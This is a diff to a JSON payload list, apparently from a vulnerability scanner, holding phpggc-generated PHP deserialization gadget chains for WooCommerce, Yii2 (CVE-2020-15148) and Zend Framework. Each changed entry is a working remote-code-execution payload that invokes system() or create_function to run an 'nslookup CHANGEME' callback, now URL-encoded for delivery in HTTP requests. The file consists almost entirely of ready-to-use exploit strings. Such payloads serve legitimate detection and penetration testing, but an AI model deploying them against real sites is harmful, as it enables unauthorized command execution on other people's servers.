@@ -177,7 +177,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "WordPress/P/WooCommerce <= 3.4.0 (2)",
     "gen_with": "./phpggc WordPress/P/WooCommerce/RCE2 <function> <parameter>",
-    "payload": "O:9:\"WC_Logger\":1:{s:19:\"WC_Logger_handles\";O:33:\"Requests_Utility_FilteredIterator\":4:{i:0;i:0;i:1;a:1:{i:0;s:72:\"nslookup CHANGEME\";}i:2;a:1:{s:11:\"*callback\";s:6:\"system\";}i:3;N;}}"
+    "payload": "O:9:\"WC_Logger\":1:{s:19:\"%00WC_Logger%00_handles\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -195,7 +195,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Yii2 < 2.0.38 (CVE-2020-15148) (1)",
     "gen_with": "./phpggc Yii2/RCE1 <function> <parameter>",
-    "payload": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"yii\\db\\BatchQueryResult_dataReader\";O:17:\"yii\\db\\Connection\":2:{s:3:\"pdo\";i:1;s:3:\"dsn\";O:26:\"yii\\db\\ColumnSchemaBuilder\":2:{s:7:\"*type\";s:1:\"x\";s:11:\"categoryMap\";O:22:\"yii\\caching\\ArrayCache\":2:{s:10:\"serializer\";a:1:{i:1;s:6:\"system\";}s:30:\"yii\\caching\\ArrayCache_cache\";a:1:{s:1:\"x\";a:2:{i:0;s:72:\"nslookup CHANGEME\";i:1;i:0;}}}}}}"
+    "payload": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"%00yii\\db\\BatchQueryResult%00_dataReader\"%3BO:17:\"yii\\db\\Connection\":2:{s:3:\"pdo\"%3Bi:1%3Bs:3:\"dsn\"%3BO:26:\"yii\\db\\ColumnSchemaBuilder\":2:{s:7:\"%00*%00type\"%3Bs:1:\"x\"%3Bs:11:\"categoryMap\"%3BO:22:\"yii\\caching\\ArrayCache\":2:{s:10:\"serializer\"%3Ba:1:{i:1%3Bs:6:\"system\"%3B}s:30:\"%00yii\\caching\\ArrayCache%00_cache\"%3Ba:1:{s:1:\"x\"%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bi:1%3Bi:0%3B}}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -225,6 +225,6 @@
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (4)",
     "gen_with": "./phpggc ZendFramework/RCE4 \"system('nslookup CHANGEME');\"",
-    "payload": "O:8:\"Zend_Log\":1:{s:11:\"*_writers\";a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"*_eventsToMail\";a:1:{i:0;i:1;}s:22:\"*_layoutEventsToMail\";a:0:{}s:8:\"*_mail\";O:9:\"Zend_Mail\":0:{}s:10:\"*_layout\";O:11:\"Zend_Layout\":3:{s:13:\"*_inflector\";O:21:\"Zend_Filter_Inflector\":1:{s:9:\"*_rules\";a:1:{s:6:\"script\";a:1:{i:0;O:20:\"Zend_Filter_Callback\":2:{s:12:\"*_callback\";s:15:\"create_function\";s:11:\"*_options\";a:1:{i:0;s:0:\"\";}}}}}s:20:\"*_inflectorEnabled\";b:1;s:10:\"*_layout\";s:87:\"){}system('nslookup CHANGEME')/*\";}s:22:\"*_subjectPrependText\";N;}}}"
+    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:21:\"Zend_Filter_Inflector\":1:{s:9:\"%00*%00_rules\"%3Ba:1:{s:6:\"script\"%3Ba:1:{i:0%3BO:20:\"Zend_Filter_Callback\":2:{s:12:\"%00*%00_callback\"%3Bs:15:\"create_function\"%3Bs:11:\"%00*%00_options\"%3Ba:1:{i:0%3Bs:0:\"\"%3B}}}}}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:88:\"){}system('nslookup CHANGEME')%3B/*\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
   }
 ]
